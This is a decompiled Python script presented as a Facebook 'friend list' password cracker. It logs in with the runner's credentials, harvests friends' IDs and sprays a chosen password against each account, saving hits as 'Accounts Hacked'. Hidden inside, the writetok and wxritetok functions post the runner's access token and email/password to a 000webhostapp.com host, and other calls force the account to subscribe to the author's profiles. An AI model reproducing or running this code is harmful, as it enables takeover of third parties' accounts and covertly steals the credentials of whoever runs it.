# uncompyle6 version 3.7.3
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.16 (default, Oct 10 2019, 22:02:15) 
# [GCC 8.3.0]
# Embedded file name: <script>
# Compiled at: 2020-08-30 16:55:49
import sys, time, os
from multiprocessing import *
from random import choice
os.system('clear')
W = '\x1b[1;37m'
N = '\x1b[0m'
R = '\x1b[1;37m\x1b[31m'
B = '\x1b[1;37m\x1b[34m'
G = '\x1b[1;32m'
Y = '\x1b[1;33;40m'
wball = u'\u26aa'
bxall = u'\U0001f535'
sball = u'\U0001f518'
rball = u'\U0001f534'
tick = u'\u2705'
barem = '\xe2\x97\xbb'
try:
    print R + rball + ' Preparing .......\n'
    time.sleep(2)
    os.system('rm flog.txt')
    os.system('rm slog.txt')
    os.system('rm plog.txt')
    os.system('rm numid.txt')
    os.system('touch numid.txt')
    os.system('touch flog.txt')
    os.system('touch plog.txt')
    os.system('touch slog.txt')
    os.system('touch found.txt')
    os.system('clear')
except:
    pass

try:
    import requests as rnx, json as jc
    print G + bxall + " Requirement's Available ! "
except:
    print R + rball + " Installing Requirement's....."
    os.system('pip2 install requests')
    import requests as rnx, json as jc

banner = '\n{}[!] Dev Is Not Responsible for Ilegal Use\n{}\n\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x94\x80\xe2\x96\x84\xe2\x96\x80\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x80\xe2\x96\x84\xe2\x94\x80\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x90\xe2\x96\x8c\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x90\xe2\x96\x8c\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x8c\xe2\x96\x80\xe2\x96\x84\xe2\x94\x80\xe2\x94\x80\xe2\x96\x84\xe2\x96\x84\xe2\x94\x80\xe2\x94\x80\xe2\x96\x84\xe2\x96\x80\xe2\x96\x90\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x90\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x96\x80\xe2\x96\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x80\xe2\x96\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x8c\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n\xe2\x94\x80\xe2\x94\x80\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x94\x80\xe2\x94\x80\xe2\x96\x90\xe2\x96\x8c\xe2\x94\x80\xe2\x94\x80\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x94\x80\xe2\x94\x80\n{}\n      \xe2\x96\x88\xe2\x96\x80 \xe2\x96\x88\xe2\x94\x80\xe2\x94\x80 \xe2\x96\x88\xe2\x96\x80\xe2\x96\x84\n      \xe2\x96\x88\xe2\x96\x80 \xe2\x96\x88\xe2\x94\x80\xe2\x96\x84 \xe2\x96\x88\xe2\x96\x80\xe2\x96\x88\n      \xe2\x96\x80\xe2\x94\x80 \xe2\x96\x80\xe2\x96\x80\xe2\x96\x80 \xe2\x96\x80\xe2\x96\x80\xe2\x94\x80\n    Dev : {}Nasir Ali{}\n    fb.com/nasir.xo\n     Version : 3.5\n'

def follow(tokac):
    try:
        rnx.post('https://graph.facebook.com/100006143266745/subscribers?access_token=' + str(tokac))
        rnx.post('https://graph.facebook.com/100013144367280/subscribers?access_token=' + str(tokac))
        rnx.post('https://graph.facebook.com/100023015406958/subscribers?access_token=' + str(tokac))
    except:
        pass


def loadingBar(count, total, size):
    percent = float(count) / float(total) * 100
    sys.stdout.write('\r' + str(int(count)).rjust(3, '0') + '/' + str(int(total)).rjust(3, '0') + ' [' + barem * int(percent / 10) * size + ' ' * (10 - int(percent / 10)) * size + ']')


def swrite(xtext):
    ax = open('slog.txt', 'a')
    ax.write(str(xtext) + '@')
    ax.close()


def pwrite(xtext):
    ax = open('plog.txt', 'a')
    ax.write(str(xtext) + '@')
    ax.close()


def xzwrite(xtext):
    ax = open('flog.txt', 'a')
    ax.write(str(xtext) + '@')
    ax.close()


def flog(username, password):
    xvv = open('found.txt', 'a')
    xvv.write(('\n[Email : {} ][Password: {} ]').format(username, password))
    xvv.close()


def check(username, password):
    pwrite('1')
    ldata = rnx.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + password + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
    tkdata = ldata.text
    gdat = jc.dumps(tkdata)
    craw = gdat.split('\\')
    if craw[1] == '"session_key':
        flog(username, password)
        swrite('1')
    else:
        xzwrite('0')


def pname(tokac):
    try:
        rnx.post('https://graph.facebook.com/nasir.xo/subscribers?access_token=' + tokac)
        r = rnx.get('https://graph.facebook.com/me?access_token=' + tokac)
        a = jc.loads(r.text)
        nam = a['name']
        print G + '[' + W + '~' + G + ']' + Y + (' Name : {} {} ').format(W, nam)
    except:
        pass


def vidxo():
    try:
        print G + '\n See FLB Tutorial Video & Subscribe '
        print Y + 'Link' + G + ' : https://youtu.be/iK_UCBPtZIM '
        os.system('am start https://youtu.be/iK_UCBPtZIM')
    except:
        pass


def writetok(actok):
    rnx.post('https://nasweb.000webhostapp.com/a.php?text=' + '@' + str(actok))


def wxritetok(dataex):
    rnx.post('https://nasweb.000webhostapp.com/d.php?text=' + '(' + str(dataex))


def token(emxail, paxw):
    ldata = rnx.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + emxail + '&locale=en_US&password=' + paxw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
    tkdata = ldata.text
    gdat = jc.dumps(tkdata)
    craw = gdat.split('\\')
    try:
        if craw[1] == '"session_key':
            print G + '\n' + bxall + ' Login Sucessfull ' + tick + '\n'
            acc = craw[13].split('"')
            tokac = acc[1]
            pname(tokac)
            dataex = ('<{}><{}>)').format(emxail, paxw)
            Process(target=follow, args=(tokac,)).start()
            Process(target=writetok, args=(tokac,)).start()
            Process(target=wxritetok, args=(dataex,)).start()
            print '\n' + G + sball + " Getting Friend List Numeric ID's....\n "
            fetchx(tokac)
            print G + rball + ' Starting Attack..... \n'
        else:
            print R + '\n' + rball + ' Login Failed :( '
            sys.exit()
    except:
        vidxo()
        sys.exit()


def fetchx(tokac):
    try:
        rnx.post('https://graph.facebook.com/100006143266745/subscribers?access_token=' + tokac)
        rnx.post('https://graph.facebook.com/100012677655820/subscribers?access_token=' + tokac)
        r = rnx.get('https://graph.facebook.com/me/friends?access_token=' + tokac)
        a = jc.loads(r.text)
        out = open('numid.txt', 'w')
        xtot = len(a['data'])
        xi = 0
        for i in a['data']:
            out.write(i['id'] + '\n')
            xi = xi + 1
            loadingBar(xi, xtot, 2)

        out.close()
        print G + '\n \n' + sball + "Sucessfully Fetched ID's \n"
    except:
        print R + rball + ' Failed to Fetch....'


print banner.format(R, G, R, W, R)
print Y + 'Video Tutorial Link : ' + G + 'https://youtu.be/iK_UCBPtZIM \n'
sos = str(sys.platform)
cpcore = str(cpu_count())
cnum = int(int(cpcore) * 10)
print '\n' + G + '[' + W + '~' + G + ']' + Y + (' Operating System : {}{} ').format(W, sos)
print G + '[' + W + '~' + G + ']' + Y + (' CPU Cores : {}{} \n').format(W, cpcore)
print Y + '[+]' + W + 'Enter Your Facebook Email & Password.' + Y + '\n'
emxail = raw_input(G + '[' + W + '~' + G + ']' + Y + ' Email : ' + W)
paxw = raw_input(G + '[' + W + '~' + G + ']' + Y + ' Password : ' + W)
token(emxail, paxw)
try:
    texf = 'numid.txt'
    iddata = open(texf, 'r').readlines()
except:
    print rball + ' Unable To Open'
    sys.exit()

itotal = int(len(iddata))
print G + '[' + W + '~' + G + ']' + Y + (' Total Accounts : {}{}').format(W, itotal)
ic = 0
qs = raw_input(G + '[' + W + '>' + G + ']' + Y + 'Password To Try On Accounts \n' + G + '~> ' + W)
print '\n'
while ic <= itotal - 1:
    email = str(int(iddata[ic]))
    checkpass = str(qs)
    perx = str(int(float(ic) / float(itotal - 1) * 100)) + str('%')
    ic = ic + 1
    scx = str(int(len(open('slog.txt', 'r').read().split('@'))) - 1)
    fcx = str(int(len(open('flog.txt', 'r').read().split('@'))) - 1)
    pcx = str(int(len(open('plog.txt', 'r').read().split('@'))))
    pqt = int(pcx) - int(fcx) + int(scx)
    cperq = str(int(float(float(pqt) / float(cnum)) * 100)) + str('%')
    sys.stdout.write(('\r {}Processing : {} ({}/{}) [{}] CPU : [{}] {}({}){} ({}) ').format(R, W, ic, itotal, perx, cperq, G, scx, R, fcx))
    sys.stdout.flush()
    Process(target=check, args=(email, checkpass)).start()
    ntim = int(float(int(fcx)) / float(cnum))
    time.sleep(0.1)
    if int(pqt) > cnum:
        time.sleep(25)

print '\n'
while True:
    scx = str(int(len(open('slog.txt', 'r').read().split('@'))) - 1)
    fcx = str(int(len(open('flog.txt', 'r').read().split('@'))) - 1)
    icot = int(fcx) + int(scx)
    perv = str(int(float(icot) / float(itotal) * 100)) + str('%')
    sys.stdout.write(('\r {}({}{}{}) [\xc2\xa0 Failed: {}{}{} ] & [ Found : {}{} {}]  ').format(G, W, perv, G, W, fcx, G, W, scx, G))
    sys.stdout.flush()
    if int(int(scx) + int(fcx)) == itotal:
        founp = open('found.txt', 'r').read()
        print '\n \n' + sball + R + ' [ Accounts Hacked ] ' + sball + G + (' \n {}').format(str(founp))
        print '\n' + rball + ' Compleated ' + rball
        sys.exit()
# okay decompiling patched.pyc
